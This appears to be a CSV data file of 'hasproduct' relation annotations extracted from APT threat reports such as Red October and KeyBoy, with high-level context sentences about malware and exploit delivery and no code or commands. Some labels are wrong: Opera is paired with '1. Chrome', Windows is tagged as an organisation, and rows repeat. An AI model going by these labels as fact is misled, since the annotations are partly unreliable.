"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack","hasproduct","Opera","ORG","1. Chrome","PRODUCT","Chrome , Mozilla Firefox , Internet Explorer , Opera 1 . Chrome history : Before the malware is performing the SQL queries on the browsers profile - files , it copies the original file into a temp - file . "
"KeyBoy_Vietnam_India","hasproduct","Mozilla","ORG","Firefox","PRODUCT","Following you can see the portion of the code where the backdoor , after having verified which version of Mozilla Firefox is installed on the system , decides which technique to use to recover the credentials from the browser 's local storage . "
"securelist.com-Red October Diplomatic Cyber Attacks Investigation","hasproduct","Microsoft","ORG","Excel","PRODUCT","The malicious code was delivered via e - mail as attachments ( Microsoft Excel , Word and , probably PDF documents ) which were rigged with exploit code for known security vulnerabilities in the mentioned applications . "
"Safe-a-targeted-threat","hasproduct","Mozilla","ORG","Firefox","PRODUCT","( IE ) and Mozilla Firefox . as well as any stored Remote Desktop Protocol ( RDP ) credentials.4 4 The tools are publicly available at http://www.nirsoft.net/. Figure 8 : Password extraction tools C&C We found two sets of C&C servers that do not seem to have anything in common apart from being used in conjunction with the same malware . "
"The-Eye-of-the-Tiger2","hasproduct","Microsoft","ORG","Windows","PRODUCT","The presence of a Chinese version of “ calc.exe ” , the official calculator provided in Microsoft Windows , is interesting . "
"Securelist_RedOctober_Detail","hasproduct","Microsoft","ORG","Word","PRODUCT","Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks . "
"themysteryofthepdf0-dayassemblermicrobackdoor","hasproduct","Adobe","ORG","Reader","PRODUCT","On Feb 12th 2013 , FireEye announced the discovery ( http://blog.fireeye.com/research/2013/02/the-number-of-the-beast.html ) of an Adobe Reader 0 - day exploit which is used to drop a previously unknown , advanced piece of malware . "
"Securelist_RedOctober_Detail","hasproduct","Microsoft","ORG","Excel","PRODUCT","The malicious code was delivered via e - mail as attachments ( Microsoft Excel , Word and , probably PDF documents ) which were rigged with exploit code for known security vulnerabilities in the mentioned applications . "
"Securelist_RedOctober_Detail","hasproduct","Microsoft","ORG","Excel","PRODUCT","Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks . "
"wp-fakem-rat","hasproduct","Windows","ORG","Messenger","PRODUCT","FIGURE 7 : FAKEM domains associated with the Windows Messenger and HTML variants Meanwhile , the Yahoo ! "
